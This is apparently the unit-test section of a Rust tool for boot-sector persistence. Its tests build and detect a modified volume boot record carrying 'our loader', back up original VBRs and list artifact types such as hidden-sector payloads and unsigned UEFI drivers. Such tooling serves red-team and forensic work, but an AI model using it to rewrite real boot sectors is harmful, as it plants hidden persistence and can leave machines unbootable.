        vbr[1] = 0x3C; // jump target
        vbr[2] = 0x90; // NOP
        vbr[510] = 0x55;
        vbr[511] = 0xAA;
        assert!(validate_vbr(&vbr).is_ok());
    }

    #[test]
    fn test_validate_vbr_invalid_signature() {
        let mut vbr = vec![0u8; SECTOR_SIZE];
        vbr[0] = 0xEB;
        vbr[1] = 0x3C;
        vbr[510] = 0x00; // Invalid signature
        vbr[511] = 0x00;
        assert!(validate_vbr(&vbr).is_err());
    }

    #[test]
    fn test_validate_vbr_no_jump() {
        let mut vbr = vec![0u8; SECTOR_SIZE];
        vbr[0] = 0x90; // NOP, not a jump
        vbr[510] = 0x55;
        vbr[511] = 0xAA;
        assert!(validate_vbr(&vbr).is_err());
    }

    #[test]
    fn test_validate_vbr_wrong_size() {
        let vbr = vec![0u8; 256];
        assert!(validate_vbr(&vbr).is_err());
    }

    #[test]
    fn test_build_modified_vbr_preserves_bpb_and_sig() {
        let mut original = vec![0u8; SECTOR_SIZE];
        original[0] = 0xEB; // jump
        original[1] = 0x3C;
        original[510] = 0x55;
        original[511] = 0xAA;
        // Fill BPB with test pattern.
        for i in 11..62 {
            original[i] = 0xAA;
        }

        let modified = build_modified_vbr(&original, 1024).unwrap();

        // BPB should be preserved.
        for i in 11..62 {
            assert_eq!(modified[i], 0xAA, "BPB byte {} modified", i);
        }
        // Boot signature preserved.
        assert_eq!(modified[510], 0x55);
        assert_eq!(modified[511], 0xAA);
        // Modified VBR should start with a jump.
        assert!(modified[0] == 0xE9 || modified[0] == 0xEB);
    }

    #[test]
    fn test_detect_modified_vbr_our_loader() {
        let mut vbr = vec![0u8; SECTOR_SIZE];
        vbr[0] = 0xEB;
        vbr[510] = 0x55;
        vbr[511] = 0xAA;
        // Insert our loader signature at offset 62.
        vbr[62] = 0xB8;
        vbr[63] = 0x00;
        vbr[64] = 0x80;
        vbr[65] = 0x8E;
        vbr[66] = 0xC0;
        assert!(detect_modified_vbr(&vbr));
    }

    #[test]
    fn test_detect_clean_vbr() {
        let mut vbr = vec![0u8; SECTOR_SIZE];
        vbr[0] = 0xEB;
        vbr[510] = 0x55;
        vbr[511] = 0xAA;
        // No loader signature.
        assert!(!detect_modified_vbr(&vbr));
    }

    #[test]
    fn test_sha256_hex_known_input() {
        let data = b"hello";
        let hash = sha256_hex(data);
        // SHA-256 of "hello" is a known value.
        assert_eq!(hash.len(), 64); // 32 bytes = 64 hex chars
    }

    #[test]
    fn test_extract_first_partition_lba() {
        let mut mbr = vec![0u8; SECTOR_SIZE];
        // Set first partition entry LBA to 2048 (0x800).
        mbr[454] = 0x00;
        mbr[455] = 0x08;
        mbr[456] = 0x00;
        mbr[457] = 0x00;
        assert_eq!(extract_first_partition_lba(&mbr), 2048);
    }

    #[test]
    fn test_persistence_artifact_types() {
        let types = [
            PersistenceArtifactType::VbrModification,
            PersistenceArtifactType::MbrModification,
            PersistenceArtifactType::EfiBootEntry,
            PersistenceArtifactType::UnsignedUefiDriver,
            PersistenceArtifactType::NvramBootOrderModification,
            PersistenceArtifactType::HiddenSectorPayload,
        ];
        // Verify all types serialize/deserialize.
        for t in &types {
            let json = serde_json::to_string(t).unwrap();
            let back: PersistenceArtifactType = serde_json::from_str(&json).unwrap();
            assert_eq!(*t, back);
        }
    }

    #[test]
    fn test_vbr_backup_serialization() {
        let backup = VbrBackup {
            original_vbr: vec![0x55; SECTOR_SIZE],
            disk_path: "/dev/sda".to_string(),
            vbr_lba: 2048,
            partition_number: 1,
            timestamp: "2026-01-01T00:00:00".to_string(),
            hash: "abc123".to_string(),
        };
        let json = serde_json::to_string(&backup).unwrap();
        let back: VbrBackup = serde_json::from_str(&json).unwrap();
        assert_eq!(back.vbr_lba, 2048);
        assert_eq!(back.partition_number, 1);
        assert_eq!(back.original_vbr.len(), SECTOR_SIZE);
    }
}
